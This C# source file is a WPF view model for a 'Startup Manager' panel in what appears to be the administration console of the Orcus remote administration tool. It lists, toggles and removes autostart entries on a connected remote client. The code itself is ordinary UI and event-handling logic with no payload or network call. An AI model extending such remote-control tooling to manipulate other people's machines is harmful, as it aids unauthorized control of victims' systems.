using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Linq;
using System.Windows;
using System.Windows.Data;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.StartupManager;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.Extensions;
using Orcus.Shared.Commands.StartupManager;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(11)]
    public class StartupManagerViewModel : CommandView
    {
        private ObservableCollection<AutostartProgramInfo> _autostartPrograms;
        private RelayCommand _checkedChangeRequestCommand;
        private ICollectionView _collectionView;
        private RelayCommand _openPathInFileExplorerCommand;
        private RelayCommand _refreshCommand;
        private RelayCommand _removeAutostartEntryCommand;
        private StartupManagerCommand _startupManagerCommand;

        public override string Name { get; } = (string) Application.Current.Resources["StartupManager"];
        public override Category Category { get; } = Category.System;

        public ICollectionView CollectionView
        {
            get { return _collectionView; }
            set { SetProperty(value, ref _collectionView); }
        }

        public RelayCommand RefreshCommand
        {
            get
            {
                return _refreshCommand ??
                       (_refreshCommand =
                           new RelayCommand(parameter => { _startupManagerCommand.GetAutostartEntries(); }));
            }
        }

        public RelayCommand CheckedChangeRequestCommand
        {
            get
            {
                return _checkedChangeRequestCommand ??
                       (_checkedChangeRequestCommand = new RelayCommand(parameter =>
                       {
                           var request = (CheckedChangeRequest) parameter;
                           var autostartProgramInfo = (AutostartProgramInfo) request.Parameter;
                           if (autostartProgramInfo == null)
                               return;

                           if (autostartProgramInfo.IsEnabled == request.RequestedStatus)
                           {
                               request.AcceptRequest();
                               return;
                           }

                           EventHandler<EntryChangedEventArgs> handler = null;
                           EventHandler<EntryChangedEventArgs> errorHandler = null;

                           handler = (sender, info) =>
                           {
                               if (info.AutostartLocation != autostartProgramInfo.AutostartLocation ||
                                   info.Name != autostartProgramInfo.Name ||
                                   info.IsEnabled != autostartProgramInfo.IsEnabled)
                                   return;

                               if (request.RequestedStatus)
                                   _startupManagerCommand.AutostartEntryEnabled -= handler;
                               else
                                   _startupManagerCommand.AutostartEntryDisabled -= handler;
                               _startupManagerCommand.ChangingAutostartEntryFailed -= errorHandler;

                               Application.Current.Dispatcher.BeginInvoke(request.AcceptRequest);
                           };

                           errorHandler = (sender, args) =>
                           {
                               if (args.AutostartLocation != autostartProgramInfo.AutostartLocation ||
                                   args.Name != autostartProgramInfo.Name ||
                                   args.IsEnabled != autostartProgramInfo.IsEnabled)
                                   return;

                               if (request.RequestedStatus)
                                   _startupManagerCommand.AutostartEntryEnabled -= handler;
                               else
                                   _startupManagerCommand.AutostartEntryDisabled -= handler;

                               _startupManagerCommand.ChangingAutostartEntryFailed -= errorHandler;
                           };

                           if (request.RequestedStatus)
                               _startupManagerCommand.AutostartEntryEnabled += handler;
                           else
                               _startupManagerCommand.AutostartEntryDisabled += handler;

                           _startupManagerCommand.ChangingAutostartEntryFailed += errorHandler;

                           _startupManagerCommand.ChangeAutostartEntry(autostartProgramInfo, request.RequestedStatus);
                       }));
            }
        }

        public RelayCommand RemoveAutostartEntryCommand
        {
            get
            {
                return _removeAutostartEntryCommand ?? (_removeAutostartEntryCommand = new RelayCommand(parameter =>
                {
                    var autostartEntry = parameter as AutostartProgramInfo;
                    if (autostartEntry == null)
                        return;

                    _startupManagerCommand.RemoveAutostartEntry(autostartEntry);
                }));
            }
        }

        public RelayCommand OpenPathInFileExplorerCommand
        {
            get
            {
                return _openPathInFileExplorerCommand ?? (_openPathInFileExplorerCommand = new RelayCommand(parameter =>
                {
                    var program = parameter as AutostartProgramInfo;
                    if (string.IsNullOrEmpty(program?.Filename))
                        return;

                    CrossViewManager.OpenPathInFileExplorer(System.IO.Path.GetDirectoryName(program.Filename));
                }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _startupManagerCommand = clientController.Commander.GetCommand<StartupManagerCommand>();
            _startupManagerCommand.AutostartEntriesReceived += StartupManagerCommandOnAutostartEntriesReceived;
            _startupManagerCommand.AutostartEntryRemoved += StartupManagerCommandOnAutostartEntryRemoved;
        }

        public override void LoadView(bool loadData)
        {
            if (loadData)
                RefreshCommand.Execute(null);
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/StartLog_16x.png", UriKind.Absolute));
        }

        private void StartupManagerCommandOnAutostartEntryRemoved(object sender, EntryChangedEventArgs entryInfo)
        {
            var entry =
                _autostartPrograms?.FirstOrDefault(
                    x =>
                        x.IsEnabled == entryInfo.IsEnabled && x.Name == entryInfo.Name &&
                        x.AutostartLocation == entryInfo.AutostartLocation);
            if (entry != null)
                Application.Current.Dispatcher.BeginInvoke(new Action(() => _autostartPrograms.Remove(entry)));
        }

        private void StartupManagerCommandOnAutostartEntriesReceived(object sender,
            List<AutostartProgramInfo> autostartProgramInfos)
        {
            Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                _autostartPrograms =
                    new ObservableCollection<AutostartProgramInfo>(
                        autostartProgramInfos.OrderBy(x => x.AutostartLocation).ThenBy(x => x.Name));

                CollectionView = CollectionViewSource.GetDefaultView(_autostartPrograms);
                CollectionView.GroupDescriptions.Add(new PropertyGroupDescription("AutostartLocation"));
            }));
        }
    }
}